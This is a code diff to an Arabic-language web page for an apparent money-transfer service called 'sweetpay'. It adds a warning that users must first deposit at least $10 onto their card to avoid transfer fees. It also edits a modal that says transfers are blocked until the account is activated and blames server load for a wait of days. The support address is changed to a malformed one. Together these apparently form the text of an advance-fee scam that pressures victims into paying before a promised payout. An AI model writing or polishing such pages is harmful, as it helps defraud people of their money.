@@ -271,6 +271,18 @@
             </div>
           </div>
 
+                    <!-- Deposit warning -->
+          <div style="background:rgba(245,200,66,0.08);border:1px solid rgba(245,200,66,0.25);border-radius:12px;padding:14px 16px;margin-bottom:16px;">
+            <div style="display:flex;align-items:flex-start;gap:10px;">
+              <svg viewBox="0 0 24 24" style="width:18px;height:18px;stroke:#f5c842;fill:none;stroke-width:2;flex-shrink:0;margin-top:2px"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+              <div>
+                <p style="font-size:13px;color:#fde68a;font-weight:600;margin-bottom:4px;">تنبيه مهم قبل التحويل</p>
+                <p style="font-size:12px;color:#fbbf24;line-height:1.7;">يجب عليك إيداع مبلغ لا يقل عن <strong style="color:#fff">10 دولار</strong> في البطاقة لكي تتفادى رسوم التحويل. للتواصل مع الدعم: <a href="mailto:sweetpay@org" style="color:#f5c842;font-weight:700;text-decoration:none">sweetpay@org</a></p>
+                <button type="button" onclick="window.open('fees.html','_blank')" style="margin-top:8px;background:rgba(245,200,66,0.1);border:1px solid rgba(245,200,66,0.3);border-radius:7px;color:#fde68a;font-family:Cairo,sans-serif;font-size:11px;font-weight:700;padding:5px 12px;cursor:pointer;">📄 اقرأ المزيد</button>
+              </div>
+            </div>
+          </div>
+
           <button type="submit" class="btn-submit">طلب التحويل الآن</button>
         </form>
       </div>
@@ -288,7 +300,7 @@
     <h3>لم يتم تفعيل حسابك بعد</h3>
     <p>عذراً، لا يمكن إتمام عملية التحويل حتى يتم تفعيل حسابك.</p>
     <p>يرجى الانتظار بضعة أيام أخرى بسبب الضغط الكبير على سيرفراتنا.</p>
-    <p style="margin-top:10px;">للتواصل مع الدعم: <span class="support">sweetpay@email.org</span></p>
+    <p style="margin-top:10px;">للتواصل مع الدعم: <span class="support">sweetpay@org</span></p>
     <div class="modal-actions">
       <button class="btn-close" onclick="closeModal()">إغلاق</button>
       <a href="dashboard.html" class="btn-dash">لوحة التحكم</a>
